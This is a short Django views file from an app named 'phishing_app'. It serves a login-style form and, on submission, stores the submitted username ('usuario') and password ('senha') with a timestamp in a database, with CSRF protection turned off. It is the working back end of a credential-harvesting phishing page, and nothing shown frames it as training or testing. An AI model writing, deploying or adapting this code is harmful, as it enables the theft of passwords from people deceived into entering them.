from django.http import JsonResponse
from django.shortcuts import render
from django.views import View
from datetime import datetime

from django.views.decorators.csrf import csrf_exempt

from apps.phishing_app import models


class Phishing(View):
    def get(self, request):
        return render(request, 'phishing_app/form_phishing.html')

    @csrf_exempt
    def post(self, request):
        usuario = request.POST['usuario']
        senha = request.POST['senha']
        data = datetime.now()

        objeto = models.Phishing(
            usuario=usuario,
            senha=senha,
            data_envio=data
        )

        objeto.save()

        return JsonResponse('deu bom', safe=False)